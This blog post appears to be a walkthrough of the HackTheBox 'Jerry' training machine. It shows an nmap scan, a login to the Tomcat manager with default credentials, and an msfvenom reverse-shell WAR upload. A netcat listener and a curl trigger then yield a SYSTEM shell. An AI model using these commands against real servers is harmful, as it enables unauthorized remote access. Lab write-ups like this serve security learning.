---
layout: post
title: HackTheBox - Jerry
date: 2022-06-10 15:39 +0200
author: Arcee
tags: htb box easy windows fileupload misconfiguration
categories: [HackTheBox, Box]
---

![Jerry](/assets/img/posts/htb-jerry/jerry.png)

Easy Windows box on HackTheBox, uses a Tomcat install with a default password for the Web Application Manager. Which can be used to upload a malicious war which returns a system shell. 

## Box Info:

Name: Jerry

Release date: 30-07-2018

OS: Windows

Solve date: 10-6-2022

## Enumeration
**Nmap scan results:**    
```  
nmap -sV -sC -Pn -v 10.10.10.95
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

Webserver running apache tomcat 7.0.88.
There is a link to a management app on the page, where we can login. 
Admin admin gives no result, but the page does show us that the initial setup is done with user:tomcat and password:s3cret. Using this we can log in!

On the manager webpage there is a .war file upload that we can use to upload a reverse shell and deploy it. 

We generate the reverse shell using msfvenom:  
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=9002 -f war > rev_shell-9002.war`

We also need to konw the name of the jsp page to activate it with curl. So we use jar to list the contents of the .war file:  
```
jar -ft rev_shell-9002.war
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
META-INF/
META-INF/MANIFEST.MF
WEB-INF/
WEB-INF/web.xml
mkjbjxhufdsxu.jsp
```

Next we upload this file on the webpage. Then we start a netcat server that can catch the reverse shell and finally we curl for the webpage containing the war so it gets executed. 

Start netcat server:  
`nc -lnvp 9002`

Curl webpage:  
 `curl http://10.10.10.95:8080/rev_shell-9002/mkjbjxhufdsxu.jsp`
 
 This gives us a reverse shell on the netcat!
 Now we can move to the Users\Administrator\Desktop folder where we find a txt file called "2 for the price of 1". 
 If we open this with `type 2*` we get the two flags:
 
 ```
 user.txt
70****************************00

root.txt
04****************************0e
 
 ```
